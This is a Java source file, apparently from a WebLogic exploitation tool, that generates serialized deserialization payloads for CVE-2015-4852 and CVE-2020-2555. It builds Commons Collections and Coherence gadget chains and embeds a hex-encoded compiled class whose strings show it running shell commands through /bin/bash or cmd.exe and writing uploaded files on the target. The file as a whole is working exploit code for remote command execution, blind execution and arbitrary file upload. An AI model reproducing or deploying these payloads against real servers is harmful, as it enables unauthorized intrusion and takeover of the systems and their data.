package com.supeream.serial;

import com.supeream.weblogic.BypassPayloadSelector;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.mozilla.classfile.DefiningClassLoader;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * Created by nike on 17/7/3.
 */
public class SerialDataGenerator {

    private static final String REMOTE = "com.supeream.payload.RemoteImpl";
    private static final String remoteHex = "cafebabe0000003200d10a003500720700730a000200720800740a007500760a000200770700780a0007007208007908007a0b007b007c08007d0b007b007e07007f0700800a000f00810a000f00820a000f00830a000f00840800850a007500860800870a007500880800890a008a008b0a0075008c08008d0a0075008e07008f0a001d00720800900b009100920800930800940800950800960700970a002500980a002500990a0025009a07009b07009c0a009d009e0a002a009f0a002900a00700a10a002e00720a002900a20a002e00a30800a40a002e00a50a000e00a60700a70700a80100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100214c636f6d2f737570657265616d2f7061796c6f61642f52656d6f7465496d706c3b0100046d61696e010016285b4c6a6176612f6c616e672f537472696e673b29560100036374780100164c6a617661782f6e616d696e672f436f6e746578743b01000672656d6f7465010001650100154c6a6176612f6c616e672f457863657074696f6e3b010004617267730100135b4c6a6176612f6c616e672f537472696e673b01000d537461636b4d61705461626c650700730700a907007f0100117365745365727665724c6f636174696f6e010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b2956010003636d640100124c6a6176612f6c616e672f537472696e673b01000a457863657074696f6e730700aa01000a75706c6f616446696c65010017284c6a6176612f6c616e672f537472696e673b5b42295601001066696c654f757470757453747265616d01001a4c6a6176612f696f2f46696c654f757470757453747265616d3b01000470617468010007636f6e74656e740100025b420100116765745365727665724c6f636174696f6e010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b01000262720100184c6a6176612f696f2f42756666657265645265616465723b01000273620100184c6a6176612f6c616e672f537472696e674275666665723b0100046c696e650100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b0700ab0700ac0700970700ad07009b0700a101000a536f7572636546696c6501000f52656d6f7465496d706c2e6a6176610c0037003801001f636f6d2f737570657265616d2f7061796c6f61642f52656d6f7465496d706c010005626c696e640700ab0c00ae00af0c0058005901001b6a617661782f6e616d696e672f496e697469616c436f6e74657874010007696e7374616c6c010008737570657265616d0700a90c00b000b1010009756e696e7374616c6c0c00b200b30100136a6176612f6c616e672f457863657074696f6e0100186a6176612f696f2f46696c654f757470757453747265616d0c003700b30c00b400b50c00b600380c00b7003801000a73686f776d65636f64650c00b800af0100096775657373206d653f0c00b900ba0100076f732e6e616d650700bb0c00bc00590c00bd00be01000377696e0c00bf00c00100136a6176612f7574696c2f41727261794c697374010004244e4f240700ac0c00c100c20100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c003700c30c00c400c50c00c600c70100166a6176612f696f2f42756666657265645265616465720100196a6176612f696f2f496e70757453747265616d5265616465720700ad0c00c800c90c003700ca0c003700cb0100166a6176612f6c616e672f537472696e674275666665720c00cc00be0c00cd00ce0100010a0c00cf00be0c00d000be0100106a6176612f6c616e672f4f626a65637401002e7765626c6f6769632f636c75737465722f73696e676c65746f6e2f436c75737465724d617374657252656d6f74650100146a617661782f6e616d696e672f436f6e746578740100186a6176612f726d692f52656d6f7465457863657074696f6e0100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100116a6176612f6c616e672f50726f63657373010010657175616c7349676e6f726543617365010015284c6a6176612f6c616e672f537472696e673b295a010006726562696e64010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b2956010006756e62696e64010015284c6a6176612f6c616e672f537472696e673b29560100057772697465010005285b422956010005666c757368010005636c6f736501000a73746172747357697468010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f53797374656d01000b67657450726f706572747901000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b01000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b010018284c6a6176612f696f2f496e70757453747265616d3b2956010013284c6a6176612f696f2f5265616465723b2956010008726561644c696e65010006617070656e6401002c284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275666665723b010008746f537472696e6701000a6765744d6573736167650021000200350001003600000005000100370038000100390000002f00010001000000052ab70001b100000002003a00000006000100000015003b0000000c000100000005003c003d00000009003e003f00010039000000f90003000300000061bb000259b700034c2abe05a000192a03321204b6000599000e2b2a0432b6000657a7003b2abe04a00035bb000759b700084d2a03321209b6000599000f2c120a2bb9000b0300a700162a0332120cb6000599000b2c120ab9000d0200a700044cb100010000005c005f000e0003003a00000032000c0000001a0008001c0019001d0024001e002a001f00320020003d00210049002200540023005c0028005f002600600029003b0000002a00040032002a004000410002000800540042003d000100600000004300440001000000610045004600000047000000160005fc0024070048fc0024070049f900124207004a000001004b004c000200390000003f0000000300000001b100000002003a0000000600010000002f003b00000020000300000001003c003d000000000001004d004e0001000000010045004e0002004f00000004000100500009005100520001003900000090000300030000001bbb000f592ab700104d2c2bb600112cb600122cb60013a700044db10001000000160019000e0003003a0000001e00070000003300090034000e0035001200360016003900190037001a003a003b0000002a00040009000d005300540002001a00000043004400020000001b0055004e00000000001b00560057000100470000000700025907004a0000010058005900020039000002540005000a000000ee2b1214b600159a00061216b02b100ab600174c043d1218b800194e2dc600112db6001a121bb6001c990005033dbb001d59b7001e3a042b121fb6001599001319042b07b60017b90020020057a700441c99002319041221b9002002005719041222b9002002005719042bb90020020057a7002019041223b9002002005719041224b9002002005719042bb90020020057bb0025591904b700263a05190504b60027571905b600283a06bb002959bb002a591906b6002bb7002cb7002d3a07bb002e59b7002f3a081907b60030593a09c6001319081909b600311232b6003157a7ffe81908b60033b04d2cb60034b000020000000b00e8000e000c00e700e8000e0004003a0000006e001b0000004100090042000c00440013004700150048001b0049002b004a002d004d0036004f003f0050004f005100530052005d00530067005400730056007d0057008700580090005b009b005c00a2005d00a9005f00be006000c7006300d2006400e2006700e8006800e90069003b00000070000b001500d3005a005b0002001b00cd005c004e0003003600b2005d005e0004009b004d005f0060000500a9003f00610062000600be002a00630064000700c7002100650066000800cf00190067004e000900e90005004300440002000000ee003c003d0000000000ee004d004e000100680000000c0001003600b2005d0069000400470000004800080cfd00200107006afc002107006b231cff0036000907004807006a0107006a07006b07006c07006d07006e07006f0000fc001a07006aff0005000207004807006a000107004a004f000000040001005000010070000000020071";


    private static byte[] serialData(Transformer[] transformers) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        // 初始化map 设置laymap
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        InvocationHandler handler = (InvocationHandler) Reflections
                .getFirstCtor(
                        "sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, lazyMap);

        final Map mapProxy = Map.class
                .cast(Proxy.newProxyInstance(SerialDataGenerator.class.getClassLoader(),
                        new Class[]{Map.class}, handler));

        handler = (InvocationHandler) Reflections.getFirstCtor(
                "sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, mapProxy);

        Object _handler = BypassPayloadSelector.selectBypass(handler);
        return Serializables.serialize(_handler);
    }

    private static Transformer[] defineAndLoadPayloadTransformerChain(String className, byte[] clsData, String[] bootArgs) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass",
                        new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{bootArgs}}),
                new ConstantTransformer(new HashSet())};
        return transformers;
    }

    private static BadAttributeValueExpException defineAndLoadPayload_CVE_2020_2555(String className, byte[] clsData, String[] bootArgs) throws Exception{

        /*
        构造Chain,调用DefiningClassLoader.defineClass()返回自定义的Class

        调用该Class.main()绑定RMI-reference

        */
        ValueExtractor[] aExtractors = new ValueExtractor[]{
                new ReflectionExtractor("getDeclaredConstructor", new Object[]{new Class[0]}),
                new ReflectionExtractor("newInstance", new Object[]{new Object[0]}),
                new ReflectionExtractor("defineClass", new Object[]{className, clsData}),
                new ReflectionExtractor("getMethod", new Object[]{"main", new Class[]{String[].class}}),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[]{bootArgs}})
        };

        //将aExtractors数组存入ChainedExtractor这个类
        ChainedExtractor extractorChain = new ChainedExtractor(aExtractors);
        //设置LimitFilter对象的属性:m_oAnchorTop、m_comparator
        LimitFilter limitEntrance = new LimitFilter();
        limitEntrance.setComparator(extractorChain);
        limitEntrance.setTopAnchor(DefiningClassLoader.class);


        //复写入口BadAttributeValueExpException，构造valObj = evilMap
        BadAttributeValueExpException evilObj = new BadAttributeValueExpException(null);

        Field valfield = evilObj.getClass().getDeclaredField("val");

        valfield.setAccessible(true);

        valfield.set(evilObj, limitEntrance);

        return evilObj;
    }

    private static Transformer[] uploadTransformerChain(String className, byte[] clsData, String filePath, byte[] content) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass",
                        new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"uploadFile", new Class[]{String.class, byte[].class}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{filePath, content}}),
                new ConstantTransformer(new HashSet())};
        return transformers;
    }

    private static Transformer[] blindExecutePayloadTransformerChain(String[] execArgs) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String[].class}, new Object[]{execArgs}),
                new ConstantTransformer(new HashSet())};
        return transformers;
    }



    public static byte[] serialRmiDatas(String[] bootArgs, boolean flag) throws Exception {

        if(!flag){
            // CVE_2015_4852
            return serialData(defineAndLoadPayloadTransformerChain(SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), bootArgs));
        }else{
            // CVE_2020_2555
            return Serializables.serialize(defineAndLoadPayload_CVE_2020_2555(SerialDataGenerator.REMOTE,BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), bootArgs));
        }

    }

    public static byte[] serialBlindDatas(String[] execArgs) throws Exception {
        return serialData(blindExecutePayloadTransformerChain(execArgs));
    }

    public static byte[] serialUploadDatas(String filePath, byte[] content) throws Exception {
        return serialData(uploadTransformerChain(SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), filePath, content));
    }

}
